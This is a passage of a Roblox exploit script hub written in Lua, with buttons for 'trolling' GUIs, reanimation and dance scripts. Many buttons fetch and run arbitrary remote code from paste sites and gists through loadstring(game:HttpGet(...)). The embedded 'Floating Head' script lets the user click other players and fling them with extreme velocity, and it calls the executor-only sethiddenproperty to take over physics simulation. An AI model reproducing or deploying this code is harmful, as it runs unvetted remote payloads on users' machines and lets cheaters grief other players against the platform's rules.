								character1.UpperTorso.CFrame = reanimation.Torso.CFrame * CFrame.new(0, 0.185, 0)
							end
							if character1:FindFirstChild("LowerTorso") then
								character1.LowerTorso.CFrame = reanimation.Torso.CFrame * CFrame.new(0, -0.8, 0)
							end

							--HumanoidRootPart
							if character1:FindFirstChild("HumanoidRootPart") then
								character1.HumanoidRootPart.CFrame = cHRP.CFrame
							end

							--Left Arm
							if character1:FindFirstChild("LeftUpperArm") then
								character1.LeftUpperArm.CFrame = reanimation["Left Arm"].CFrame * CFrame.new(0, 0.4, 0)
							end
							if character1:FindFirstChild("LeftLowerArm") then
								character1.LeftLowerArm.CFrame = reanimation["Left Arm"].CFrame * CFrame.new(0, -0.19, 0)
							end
							if character1:FindFirstChild("LeftHand") then
								character1.LeftHand.CFrame = reanimation["Left Arm"].CFrame * CFrame.new(0, -0.84, 0)
							end

							--Right Arm
							if character1:FindFirstChild("RightUpperArm") then
								character1.RightUpperArm.CFrame = reanimation["Right Arm"].CFrame * CFrame.new(0, 0.4, 0)
							end
							if character1:FindFirstChild("RightLowerArm") then
								character1.RightLowerArm.CFrame = reanimation["Right Arm"].CFrame * CFrame.new(0, -0.19, 0)
							end
							if character1:FindFirstChild("RightHand") then
								character1.RightHand.CFrame = reanimation["Right Arm"].CFrame * CFrame.new(0, -0.84, 0)
							end

							--Left Leg
							if character1:FindFirstChild("LeftUpperLeg") then
								character1.LeftUpperLeg.CFrame = reanimation["Left Leg"].CFrame * CFrame.new(0, 0.55, 0)
							end
							if character1:FindFirstChild("LeftLowerLeg") then
								character1.LeftLowerLeg.CFrame = reanimation["Left Leg"].CFrame * CFrame.new(0, -0.19, 0)
							end
							if character1:FindFirstChild("LeftFoot") then
								character1.LeftFoot.CFrame = reanimation["Left Leg"].CFrame * CFrame.new(0, -0.85, 0)
							end

							--Right Leg
							if character1:FindFirstChild("RightUpperLeg") then
								character1.RightUpperLeg.CFrame = reanimation["Right Leg"].CFrame * CFrame.new(0, 0.55, 0)
							end
							if character1:FindFirstChild("RightLowerLeg") then
								character1.RightLowerLeg.CFrame = reanimation["Right Leg"].CFrame * CFrame.new(0, -0.19, 0)
							end
							if character1:FindFirstChild("RightFoot") then
								character1.RightFoot.CFrame = reanimation["Right Leg"].CFrame * CFrame.new(0, -0.85, 0)
							end
						end
					end

					if v:IsA("Accessory") then
						v.Handle.Velocity = Vector3.new(hatVelocity[1], hatVelocity[2], hatVelocity[3])
						v.Handle.CFrame = reanimation:FindFirstChild(v.Name).Handle.CFrame
					end
				end
			end)

			game:GetService("RunService").Stepped:Connect(function()
				for i,v in pairs(reanimation:GetChildren()) do
					if v:IsA("BasePart") then
						v.CanCollide = false
					end
				end
			end)


			--------------------------------------------------------------------

			wait(9e9)
		end
		Script()
		wait(2)
		local Players = game:GetService("Players")
		local lp = Players.LocalPlayer
		local character = reanimation--lp.Character
		local A0LL = Instance.new("Attachment", character["Left Leg"])
		A0LL.Position = Vector3.new(0, 1, 0)
		local A1LL = Instance.new("Attachment", character["Torso"])
		A1LL.Position = Vector3.new(-0.5, -1, 0)
		local socket1 = Instance.new("BallSocketConstraint", character["Left Leg"])
		socket1.Attachment0 = A0LL
		socket1.Attachment1 = A1LL
		local A0RL = Instance.new("Attachment", character["Right Leg"])
		A0RL.Position = Vector3.new(0, 1, 0)
		local A1RL = Instance.new("Attachment", character["Torso"])
		A1RL.Position = Vector3.new(0.5, -1, 0)
		local socket2 = Instance.new("BallSocketConstraint", character["Right Leg"])
		socket2.Attachment0 = A0RL
		socket2.Attachment1 = A1RL
		local A0H = Instance.new("Attachment", character["Head"])
		A0H.Position = Vector3.new(0, -0.5, 0)
		local A1H = Instance.new("Attachment", character["Torso"])
		A1H.Position = Vector3.new(0, 1, 0)
		local socket5 = Instance.new("BallSocketConstraint", character["Head"])
		socket5.Attachment0 = A0H
		socket5.Attachment1 = A1H
		--loadstring(game:HttpGet("https://ghostbin.co/paste/krmyf/raw", true))()
		-----------------------------------------------------------
		wait(9e9)
	end    
})

Tab:AddLabel("---------------------------------------")

Tab:AddParagraph("Character Features","- FE")




local Section = Tab:AddSection({
	Name = "Animation Guis"
})

Tab:AddButton({
	Name = "Ultimate Trolling GUI V3",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))()
	end    
})


Tab:AddButton({
	Name = "Energize Animations",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Energize-10408"))()
	end    
})


Tab:AddButton({
	Name = "Elysian GUI",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/MrWitzbold/Elysian-2.0-GUI/refs/heads/main/main.lua"))()
	end    
})




local Section = Tab:AddSection({
	Name = "Animations"
})




Tab:AddButton({
	Name = "Enrage",
	Callback = function()
		loadstring(game:HttpGet("https://pastefy.app/2C3cRXXp/raw"))()
	end    
})


Tab:AddButton({
	Name = "Honored One.",
	Callback = function()
		-- HONORED ONE\
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/Scripts%20Folder/Honored.lua'),true))()
	end    
})

Tab:AddButton({
	Name = "Krystal Dance",
	Callback = function()
		--crystal dance
		loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/e51327540d1ba5ede244c459dbdb5a0e/raw/6320fe344ac51a311ef7c9f8d5c3924b1a7c3969/Krystal%2520Dance'))()
	end    
})

Tab:AddButton({
	Name = "Melon Dance",
	Callback = function()
		loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/7852526975c7ffba470e429301e67252/raw/6b72183f193945ceed40b9562c35e5a0b5b1dd65/Addict.lua"))()
	end    
})

Tab:AddButton({
	Name = "Chips",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/xxsTeJYX"))()
	end    
})


Tab:AddButton({
	Name = "Floating Head",
	Callback = function()
		-- Name: Da Feets by Tescalus
		-- Converted: By Bluecat
		-- Fixed: By Melon
		-- USES EMPER'S REANIMATE, MADE BY EMPER
--[[
https://www.roblox.com/catalog/14255556501/Extra-Right-White-Arm
https://www.roblox.com/catalog/14255554762/Extra-Left-White-Arm
https://www.roblox.com/catalog/14768693948/White-Extended-Right-Arm
https://www.roblox.com/catalog/14768701869/White-Extended-Left-Arm 
https://www.roblox.com/catalog/14255528083/Torso-Extension
or
https://www.roblox.com/catalog/13779879140/Black-Fluffy-Fur-Body
(ANYTHING CAN BE USED FOR THE TORSO SUCH AS A VEST.)
]]--

		game:GetService("StarterGui"):SetCore("SendNotification", { 
			Title = "Melon's (FE) Scripts";
			Text = "Have fun!";
			Icon = "rbxthumb://type=Asset&id=13446503788&w=150&h=150"})
		Duration = 16;

		if not game:IsLoaded() then
			game.Loaded:Wait()
		end

		local function FindInstance(Parent, ClassName, Name)
			for _, Instance in pairs(Parent:GetChildren()) do
				if Instance:IsA(ClassName) and Instance.Name == Name then
					return Instance
				end
			end
		end

		local function WaitForClass(Parent, ClassName)
			local Instance = Parent:FindFirstChildOfClass(ClassName)

			while not Instance and Parent do
				Parent.ChildAdded:Wait()
				Instance = Parent:FindFirstChildOfClass(ClassName)
			end

			return Instance
		end

		local function WaitForClassOfName(Parent, ...)
			local Instance = FindInstance(Parent, ...)

			while not Instance and Parent do
				Parent.ChildAdded:Wait()
				Instance = FindInstance(Parent, ...)
			end

			return Instance
		end

		local Fling = { }
		local Aligns = { }
		local Blacklist = { }
		local Accessories = { }
		local Attachments = { }

		local Instancenew = Instance.new

		local taskwait = task.wait
		local taskspawn = task.spawn
		local taskdefer = task.defer

		local mathabs = math.abs
		local mathcos = math.cos
		local mathrandom = math.random

		local stringmatch = string.match

		local osclock = os.clock

		local tableinsert = table.insert
		local tableclear = table.clear
		local tablefind = table.find

		local CFramenew = CFrame.new
		local CFrameAngles = CFrame.Angles
		local CFrameidentity = CFrame.identity

		local Vector3new = Vector3.new
		local Vector3zero = Vector3.zero

		local Sleep = CFrameidentity
		local Velocity = Vector3new(0, 16384, 0)
		local Angular = 0
		local Linear = 0

		local Workspace = game:FindFirstChildOfClass("Workspace")
		local CurrentCamera = Workspace.CurrentCamera

		local Players = game:FindFirstChildOfClass("Players")

		local LocalPlayer = Players.LocalPlayer
		local Mouse = LocalPlayer:GetMouse()

		local PostSimulation = game:FindFirstChildOfClass("RunService").PostSimulation

		local Character = LocalPlayer.Character
		local CharacterClone = Instancenew("Model")

		local StarterGui = game:FindFirstChildOfClass("StarterGui")
		local BindableEvent = Instancenew("BindableEvent")

		local UserInputService = game:FindFirstChildOfClass("UserInputService")
		local UserInputType = Enum.UserInputType

		local MouseButton1 = UserInputType.MouseButton1
		local Touch = UserInputType.Touch

		local InputBegan = UserInputService.InputBegan:Connect(function(Input, GameProcessed)
			local Type = Input.UserInputType

			if not GameProcessed and ( Type == MouseButton1 or Type == Touch ) then
				local Target = Mouse.Target

				if Target and not Target.Anchored and not Target:IsDescendantOf(CharacterClone) and not Target:IsDescendantOf(Character) and not tablefind(Fling, Target) then
					local Parent = Target.Parent

					if Parent:IsA("Model") and Parent ~= Character and Parent:FindFirstChildOfClass("Humanoid") then
						local HumanoidRootPart = FindInstance(Parent, "BasePart", "HumanoidRootPart") or FindInstance(Parent, "BasePart", "Torso") or FindInstance(Parent, "BasePart", "Head")

						if HumanoidRootPart and not tablefind(Fling, HumanoidRootPart) then
							tableinsert(Fling, HumanoidRootPart)
							return
						end
					end

					tableinsert(Fling, Target)
				end
			end
		end)

		local function Part(Name, Size)
			local Part = Instancenew("Part")
			Part.Name = Name
			Part.Size = Size
			Part.Transparency = 1
			Part.Parent = CharacterClone

			return Part
		end

		local function Motor6D(Name, Part0, Part1, C0, C1)
			local Motor6D = Instancenew("Motor6D")
			Motor6D.Name = Name
			Motor6D.Part0 = Part0
			Motor6D.Part1 = Part1
			Motor6D.C0 = C0
			Motor6D.C1 = C1
			Motor6D.Parent = Part0

			return Motor6D
		end

		local function Attachment(Name, CFrame, Parent)
			local Attachment = Instancenew("Attachment")
			Attachment.Name = Name
			Attachment.CFrame = CFrame
			Attachment.Parent = Parent

			tableinsert(Attachments, Attachment)
			return Attachment
		end

		local LimbSize = Vector3new(1, 2, 1)
		local TorsoSize = Vector3new(2, 2, 1)

		local Head = Part("Head", Vector3new(2, 1, 1))
		local Torso = Part("Torso", TorsoSize)
		local LeftArm = Part("Left Arm", LimbSize)
		local RightArm = Part("Right Arm", LimbSize)
		local LeftLeg = Part("Left Leg", LimbSize)
		local RightLeg = Part("Right Leg", LimbSize)
		local HumanoidRootPart = Part("HumanoidRootPart", TorsoSize)

		local Part = nil

		if Character then
			Part = FindInstance(Character, "BasePart", "HumanoidRootPart") or FindInstance(Character, "BasePart", "Head") or FindInstance(Character, "BasePart", "Torso") or FindInstance(Character, "BasePart", "UpperTorso")
		end

		if Part then
			HumanoidRootPart.CFrame = Part.CFrame
		else
			local SpawnLocations = { }

			for _, SpawnLocation in pairs(Workspace:GetDescendants()) do
				if SpawnLocation:IsA("SpawnLocation") then
					tableinsert(SpawnLocations, SpawnLocation)
				end
			end

			local Amount = # SpawnLocations

			if Amount > 0 then
				local SpawnLocation = SpawnLocations[mathrandom(1, Amount)]
				HumanoidRootPart.CFrame = SpawnLocation.CFrame * CFramenew(0, SpawnLocation.Size.Y / 2 + 3, 0)
			else
				HumanoidRootPart.CFrame = CFrameidentity
			end
		end

		local face = Instancenew("Decal")
		face.Name = "face"
		face.Parent = Head

		local AccessoryTable = { 
			{ Mesh = "14241018198", Texture = "14251599953", Instance = Torso },
			{ Mesh = "14255522247", Texture = "14255543546", Instance = RightArm, CFrame = CFrameAngles(0, 1.57, 1.57) },
			{ Mesh = "14255522247", Texture = "14255543546", Instance = LeftArm, CFrame = CFrameAngles(0, - 1.57, 1.57) },
			{ Mesh = "14768684979", Texture = "14768683674", Instance = RightLeg, CFrame = CFrameAngles(0, - 1.57, 1.57) },
			{ Mesh = "14768684979", Texture = "14768683674", Instance = LeftLeg, CFrame = CFrameAngles(0, 1.57, 1.57) },
		}

		for _, Table in pairs(AccessoryTable) do
			if type(Table.Mesh) ~= "string" then
				Table.Mesh = ""
			end
			if type(Table.Texture) ~= "string" then
				Table.Texture = ""
			end
		end

		Motor6D("Right Shoulder", Torso, RightArm, CFramenew(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0), CFramenew(-0.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0))
		Motor6D("Left Shoulder", Torso, LeftArm, CFramenew(-1, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0), CFramenew(0.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0))
		Motor6D("Right Hip", Torso, RightLeg, CFramenew(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0), CFramenew(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0))
		Motor6D("Left Hip", Torso, LeftLeg, CFramenew(-1, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0), CFramenew(-0.5, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0))
		Motor6D("Neck", Torso, Head, CFramenew(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0), CFramenew(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0))
		Motor6D("RootJoint", HumanoidRootPart, Torso, CFramenew(0, 0, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0), CFramenew(0, 0, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0))

		Attachment("HairAttachment", CFramenew(0, 0.600000024, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Head)
		Attachment("HatAttachment", CFramenew(0, 0.600000024, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Head)
		Attachment("FaceFrontAttachment", CFramenew(0, 0, -0.600000024, 1, 0, 0, 0, 1, 0, 0, 0, 1), Head)
		Attachment("FaceCenterAttachment", CFramenew(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Head)
		Attachment("NeckAttachment", CFramenew(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("BodyFrontAttachment", CFramenew(0, 0, -0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("BodyBackAttachment", CFramenew(0, 0, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("LeftCollarAttachment", CFramenew(-1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("RightCollarAttachment", CFramenew(1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("WaistFrontAttachment", CFramenew(0, -1, -0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("WaistCenterAttachment", CFramenew(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("WaistBackAttachment", CFramenew(0, -1, 0.5, 1, 0, 0, 0, 1, 0, 0, 0, 1), Torso)
		Attachment("LeftShoulderAttachment", CFramenew(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), LeftArm)
		Attachment("LeftGripAttachment", CFramenew(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), LeftArm)
		Attachment("RightShoulderAttachment", CFramenew(0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), RightArm)
		Attachment("RightGripAttachment", CFramenew(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), RightArm)
		Attachment("LeftFootAttachment", CFramenew(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), LeftLeg)
		Attachment("RightFootAttachment", CFramenew(0, -1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), RightLeg)
		Attachment("RootAttachment", CFramenew(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1), HumanoidRootPart)

		local Humanoid = Instancenew("Humanoid", CharacterClone)
		Instancenew("Animator", Humanoid)

		Instancenew("LocalScript", CharacterClone).Name = "Animate"

		CharacterClone.PrimaryPart = Head
		CharacterClone.Parent = Workspace

		local function DescendantAdded(Instance)
			if Instance:IsA("Accessory") then
				taskspawn(function()
					local Handle = WaitForClassOfName(Instance, "BasePart", "Handle")
					local Attachment = WaitForClass(Handle, "Attachment")

					local Clone = Instance:Clone()

					local CloneHandle = FindInstance(Clone, "BasePart", "Handle")
					CloneHandle.Transparency = 1
					CloneHandle:BreakJoints()

					local AccessoryWeld = Instancenew("Weld")
					AccessoryWeld.Name = "AccessoryWeld"
					AccessoryWeld.Part0 = CloneHandle
					AccessoryWeld.C0 = Attachment.CFrame

					local Name = Attachment.Name

					for _, TableAttachment in pairs(Attachments) do
						if TableAttachment.Name == Name then
							AccessoryWeld.Part1 = TableAttachment.Parent
							AccessoryWeld.C1 = TableAttachment.CFrame
						end
					end

					AccessoryWeld.Parent = CloneHandle
					Clone.Parent = CharacterClone

					tableinsert(Accessories, Clone)

					local IsAMeshPart = CloneHandle:IsA("MeshPart")
					local Mesh = IsAMeshPart and CloneHandle or WaitForClass(CloneHandle, "SpecialMesh")
					local Id = IsAMeshPart and "TextureID" or "TextureId"

					for _, Table in pairs(AccessoryTable) do
						local Instance = Table.Instance

						if Instance then
							if stringmatch(Mesh.MeshId, Table.Mesh) and stringmatch(Mesh[Id], Table.Texture) and not tablefind(Blacklist, Instance) then
								tableinsert(Blacklist, Instance)
								tableinsert(Aligns, { Handle, Instance, Table.CFrame or CFrameidentity })
								return
							end
						end
					end

					tableinsert(Aligns, { Handle, CloneHandle, CFrameidentity })
				end)
			elseif Instance:IsA("JointInstance") then
				taskspawn(function()
					taskwait()
					Instance:Destroy()
				end)
			end
		end

		local function CharacterAdded(Character)
			if Character ~= CharacterClone then		
				PostSimulation:Wait()

				local Backpack = LocalPlayer:FindFirstChildOfClass("Backpack")

				if Backpack then
					Backpack:ClearAllChildren()
				end

				tableclear(Aligns)
				tableclear(Blacklist)

				for _, Accessory in pairs(Accessories) do
					Accessory:Destroy()
				end

				local CurrentCameraCFrame = CurrentCamera.CFrame

				LocalPlayer.Character = CharacterClone
				CurrentCamera.CameraSubject = CharacterClone.Head

				taskspawn(function()
					CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
					CurrentCamera.CFrame = CurrentCameraCFrame
				end)

				local CharacterHumanoidRootPart = WaitForClassOfName(Character, "BasePart", "HumanoidRootPart")

				for Index, Value in pairs(Fling) do
					local BasePart = nil

					if typeof(Value) == "Instance" then 
						if Value:IsA("BasePart") then
							BasePart = Value
						elseif Value:IsA("Humanoid") then
							local Model = Value.Parent

							if Model ~= Character and Model:IsA("Model") then
								BasePart = FindInstance(Model, "BasePart", "HumanoidRootPart") or FindInstance(Model, "BasePart", "Head") or Model:FindFirstChildOfClass("BasePart")
							end
						elseif Value:IsA("Model") and Value ~= Character then
							BasePart = FindInstance(Value, "BasePart", "HumanoidRootPart") or FindInstance(Value, "BasePart", "Head") or Value:FindFirstChildOfClass("BasePart")
						end
					end

					if BasePart then
						local clock = osclock()

						while CharacterHumanoidRootPart and BasePart and osclock() - clock <= 1 and BasePart.AssemblyLinearVelocity.Magnitude <= 60 do
							CharacterHumanoidRootPart.AssemblyAngularVelocity = Velocity
							CharacterHumanoidRootPart.AssemblyLinearVelocity = Velocity

							CharacterHumanoidRootPart.CFrame = BasePart.CFrame + Vector3new(0, - 1, 0)
							PostSimulation:Wait()
						end
					end
				end

				tableclear(Fling)

				if CharacterHumanoidRootPart then
					CharacterHumanoidRootPart.AssemblyAngularVelocity = Vector3zero
					CharacterHumanoidRootPart.AssemblyLinearVelocity = Vector3zero

					CharacterHumanoidRootPart.CFrame = CFramenew(HumanoidRootPart.Position + Vector3new(mathrandom(- 32, 32), 0, mathrandom(- 32, 32)))
					PostSimulation:Wait()
				end

				Character:BreakJoints()

				for _, Instance in pairs(Character:GetDescendants()) do
					DescendantAdded(Instance)
				end

				Character.DescendantAdded:Connect(DescendantAdded)
			end
		end

		local function Align(Part0, Part1, CFrame)
			if Part0.ReceiveAge == 0 and not Part0.Anchored and # Part0:GetJoints() == 0 then
				Part0.AssemblyAngularVelocity = Vector3new(0, Angular, 0)

				local Part1CFrame = Part1.CFrame
				local LinearVelocity = Part1.AssemblyLinearVelocity * Linear
				local Magnitude = LinearVelocity.Magnitude < Linear

				if Magnitude then
					local LookVector = Part1CFrame.LookVector * Linear
					Part0.AssemblyLinearVelocity = Vector3new(LookVector.X, Linear, LookVector.Z)
				else
					Part0.AssemblyLinearVelocity = Vector3new(LinearVelocity.X, Linear, LinearVelocity.Z)
				end

				Part0.CFrame = Part1CFrame * ( Magnitude and Sleep or CFrameidentity ) * CFrame
			end
		end

		if Character then
			CharacterAdded(Character)
		end

		local Added = LocalPlayer.CharacterAdded:Connect(CharacterAdded)

		local Connection = game:FindFirstChildOfClass("RunService").PostSimulation:Connect(function()
			local osclock = osclock()
			local Axis = 0.004 * mathcos(osclock * 17.5)

			Sleep = CFramenew(0, Axis, 0)
			Angular = mathcos(osclock)
			Linear = 26

			for _, Table in pairs(Aligns) do
				Align(Table[1], Table[2], Table[3])
			end

			if sethiddenproperty then
				sethiddenproperty(LocalPlayer, "SimulationRadius", 10000000)
			end

			StarterGui:SetCore("ResetButtonCallback", BindableEvent) -- This is if it gets overriden, just like in MyWorld testing place.
		end)

		local function Event()
			CharacterClone:Destroy()
		end

		BindableEvent.Event:Connect(Event)

		CharacterClone:GetPropertyChangedSignal("Parent"):Connect(function()
			if not CharacterClone.Parent then
				Added:Disconnect()
				Connection:Disconnect()

				CharacterClone:Destroy()

				if BindableEvent then
					BindableEvent:Destroy()
				end

				StarterGui:SetCore("ResetButtonCallback", true)
			end
		end)

		BindableEvent:GetPropertyChangedSignal("Parent"):Connect(Event)


		--// SHORTCUTS \\--
		local RNG = (function()
			local RNG = Random.new();
			return function(min,max,int)
				return int and RNG:NextInteger(min,max) or RNG:NextNumber(min,max)
			end;
		end)();
		local S = setmetatable({},{__index = function(s,i) return game:service(i) end})
		local CF = {
			N=CFrame.new;
			A=CFrame.Angles;
			fEA=CFrame.fromEulerAnglesXYZ;
		}
		local C3 = {
			N=Color3.new;
			RGB=Color3.fromRGB;
			HSV=function(...)local data={...}if(typeof(data)=='Color3')then return Color3.toHSV(...)else return Color3.fromHSV(...)end;end;
		}
		local V3 = {
			N=Vector3.new;
			FNI=Vector3.FromNormalId;
			A=Vector3.FromAxis;
		}
		local M = {
			C=math.cos;
			R=math.rad;
			S=math.sin;
			T=math.tan;
			AT=math.atan;
			AT2=math.atan2;
			AS=math.asin;
			AC=math.acos;
			A=math.abs;
			F=math.floor;
			CE=math.ceil;
			P=math.pi;
			RNG=RNG;
			H=math.huge;
			RRNG=function(...) return math.rad(RNG(...)) end
		}
		local R3 = Region3.new
		local De = S.Debris
		local WS = workspace
		local Lght = S.Lighting
		local RepS = S.ReplicatedStorage
		local IN = Instance.new
		local Plrs = S.Players

		--// INITIALIZATION --
		local Plr = Plrs.LocalPlayer
		print(Plr)
		local Char = Plr.Character
		local Hum = Char:FindFirstChildOfClass'Humanoid'
		assert(Hum and Hum.RigType==Enum.HumanoidRigType.R6,"You need to have a valid Humanoid instance! (Exising and R6)")
		local Head = Char.Head
		local RArm = Char["Right Arm"]
		local LArm = Char["Left Arm"]
		local RLeg = Char["Right Leg"]
		local LLeg = Char["Left Leg"]	
		local Torso= Char.Torso
		local Root = Char.HumanoidRootPart
		local NeutralAnims = true
		local Attack = false
		local legAnims = true
		local Mouse = Plr:GetMouse()
		local EffectFolder=Instance.new("Folder")
		EffectFolder.Name='Effects'
		EffectFolder.Parent=Char

		local Movement = 10
		local Sine = 0;
		local Change = 1;
		local wsVal = 6

		--// INSTANCE CREATORS --
		local baseSound = IN("Sound")
		function Sound(parent,id,pitch,volume,looped,effect,autoPlay)
			local Sound = baseSound:Clone()
			Sound.SoundId = "rbxassetid://".. tostring(id or 0)
			Sound.Pitch = pitch or 1
			Sound.Volume = volume or 1
			Sound.Looped = looped or false
			if(autoPlay)then
				coroutine.wrap(function()
					repeat wait() until Sound.IsLoaded
					Sound.Playing = autoPlay or false
				end)()
			end
			if(not looped and effect)then
				Sound.Stopped:connect(function()
					Sound.Volume = 0
					Sound:destroy()
				end)
			elseif(effect)then
				warn("Sound can't be looped and a sound effect!")
			end
			Sound.Parent =parent or workspace
			return Sound
		end
		function Part(parent,color,material,size,cframe,anchored,cancollide)
			local part = IN("Part")
			part[typeof(color) == 'BrickColor' and 'BrickColor' or 'Color'] = color or C3.N(0,0,0)
			part.Material = material or Enum.Material.SmoothPlastic
			part.TopSurface,part.BottomSurface=10,10
			part.Size = size or V3.N(1,1,1)
			part.CFrame = cframe or CF.N(0,0,0)
			part.CanCollide = cancollide or false
			part.Anchored = anchored or false
			part.Parent = parent
			return part
		end

		function Weld(part0,part1,c0,c1)
			local weld = IN("Weld")
			weld.Part0 = part0
			weld.Part1 = part1
			weld.C0 = c0 or CF.N()
			weld.C1 = c1 or CF.N()
			weld.Parent = part0
			return weld
		end

		function Mesh(parent,meshtype,meshid,textid,scale,offset)
			local part = IN("SpecialMesh")
			part.MeshId = meshid or ""
			part.TextureId = textid or ""
			part.Scale = scale or V3.N(1,1,1)
			part.Offset = offset or V3.N(0,0,0)
			part.MeshType = meshtype or Enum.MeshType.Sphere
			part.Parent = parent
			return part
		end

		function SoundPart(id,pitch,volume,looped,effect,autoPlay,cf)
			local soundPart = Part(EffectFolder,C3.N(1,1,1),Enum.Material.SmoothPlastic,V3.N(.05,.05,.05),cf,true,false)
			soundPart.Transparency=1
			local Sound = IN("Sound")
			Sound.SoundId = "rbxassetid://".. tostring(id or 0)
			Sound.Pitch = pitch or 1
			Sound.Volume = volume or 1
			Sound.Looped = looped or false
			if(autoPlay)then
				coroutine.wrap(function()
					repeat wait() until Sound.IsLoaded
					Sound.Playing = autoPlay or false
				end)()
			end
			if(not looped and effect)then
				Sound.Stopped:connect(function()
					Sound.Volume = 0
					soundPart:destroy()
				end)
			elseif(effect)then
				warn("Sound can't be looped and a sound effect!")
			end
			Sound.Parent = soundPart
			return Sound
		end

		function Joint(name,part0,part1,c0,c1,type)
			local joint = IN(type or "Motor6D")
			joint.Part0 = part0
			joint.Part1 = part1
			joint.C0 = c0 or CF.N()
			joint.C1 = c1 or CF.N()
			joint.Parent=part0
			joint.Name=name or part0.." to "..part1.." "..joint.ClassName
			return joint
		end

		function Animate(joint,c0,alpha,style,dir)
			if(style=='Lerp')then
				joint.C0 = joint.C0:lerp(c0,alpha)
			else
				local info = TweenInfo.new(alpha or 1,style or Enum.EasingStyle.Linear,dir or Enum.EasingDirection.Out,0,false,0)
				local tween = S.TweenService:Create(joint,info,{C0=c0})
				tween:Play();
				return tween;
			end
		end

		function NewInstance(instance,parent,properties)if(properties.Parent)then properties.Parent=parent end;local new = IN(instance)if(properties)then for prop,val in next, properties do pcall(function() new[prop]=val end)end;end;new.Parent=parent;return new;end

		function GetAdjacentParts(part)
			local function createLargerHitbox(part)
				local n = 0.2
				local clone = part:Clone()

				clone.Transparency = .8
				clone.BrickColor = BrickColor.Red()
				clone.Size = clone.Size + Vector3.new(n, n, n)
				clone.Name = "hitbox"
				clone.CFrame = part.CFrame
				clone.Anchored=true
				clone.CanCollide=true

				if (clone:IsA("WedgePart")) then
					clone.Size = clone.Size + Vector3.new(0, n, n)
					clone.CFrame = part.CFrame * CFrame.new(0, n / 2, -n /2)
				end

				if (clone:IsA("CornerWedgePart")) then
					clone.Size = clone.Size + Vector3.new(n, n, n)
					clone.CFrame = part.CFrame * CFrame.new(-n / 2, n / 2, n / 2)
				end
				clone.Parent = part

				return clone
			end

			local hitbox = createLargerHitbox(part)
			local touchingParts = hitbox:getTouchingParts()
			hitbox:Destroy()

			return (function()
				local adjacent={}
				for _,v in next, touchingParts do if(v~=part)then table.insert(adjacent,v)end;end
				return adjacent;
			end)()
		end
		--// CUSTOMIZABLE VARIABLES --

		local DamageColor = BrickColor.new'Really red';
		local MusicData = {Parent=Torso,ID=2666435584;Pitch=1;Volume=5;}
		local God = false
		local WalkSpeed = 50

		local Music = Sound(MusicData.Parent,MusicData.ID,MusicData.Pitch,MusicData.Volume,true,false,true)
		Music.Name = 'Music'

		--// JOINTS --

		local RJ = Joint("RootJoint",Root,Torso,CF.N(),CF.N())
		local NK = Joint("Neck",Torso,Head,CF.N(0,1.5,0),CF.N())
		local LS = Joint("Left Shoulder",Torso,LArm,CF.N(-.5,-2,0),CF.N(0,.5,0))
		local RS = Joint("Right Shoulder",Torso,RArm,CF.N(.5,-2,0),CF.N(0,.5,0))
		local LH = Joint("Left Hip",Torso,LLeg,CF.N(0,0,0),CF.N(0,0,0))
		local RH = Joint("Right Hip",Torso,RLeg,CF.N(0,0,0),CF.N(0,0,0))

		--Torso.Anchored = true

		local LSC0 = LS.C0
		local RSC0 = RS.C0
		local NKC0 = NK.C0
		local LHC0 = LH.C0
		local RHC0 = RH.C0
		local RJC0 = RJ.C0

		--// Artificial HB --

		local ArtificialHB = IN("BindableEvent", script)
		ArtificialHB.Name = "Heartbeat"

		script:WaitForChild("Heartbeat")

		local tf = 0
		local allowframeloss = false
		local tossremainder = false
		local lastframe = tick()
		local frame = 1/60
		ArtificialHB:Fire()

		game:GetService("RunService").Heartbeat:connect(function(s, p)
			tf = tf + s
			if tf >= frame then
				if allowframeloss then
					script.Heartbeat:Fire()
					lastframe = tick()
				else
					for i = 1, math.floor(tf / frame) do
						ArtificialHB:Fire()
					end
					lastframe = tick()
				end
				if tossremainder then
					tf = 0
				else
					tf = tf - frame * math.floor(tf / frame)
				end
			end
		end)

		function swait(num)
			if num == 0 or num == nil then
